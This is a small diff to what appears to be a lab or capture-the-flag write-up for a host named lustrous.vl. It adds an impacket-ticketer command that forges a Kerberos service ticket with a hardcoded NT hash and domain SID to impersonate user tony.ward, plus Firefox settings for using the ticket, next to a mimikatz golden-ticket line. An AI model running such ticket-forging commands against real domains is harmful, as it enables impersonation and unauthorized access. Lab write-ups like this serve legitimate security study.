@@ -1445,4 +1445,14 @@ kerberos::golden /sid:S-1-5-21-2355092754-1584501958-1513963426 /domain:lustrous
 iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials
 ```
 
+\-----OR use impacket-ticketer------
+
+```bash
+impacket-ticketer -nthash E67AF8B3D78DF5A02EB0D57B6CB60717 -domain-sid S-1-5-21-2355092754-1584501958-1513963426 -domain lustrous.vl -spn HTTP/lusdc.lustrous.vl -user-id 1114 tony.ward
+export krb5ccname=tony.ward.ccache
+firefox
+```
+
+* Have to set “network.negotiate-auth.trusted-uris” to “https://lusdc.lustrous.vl” in about:config in firefox
+
 </details>
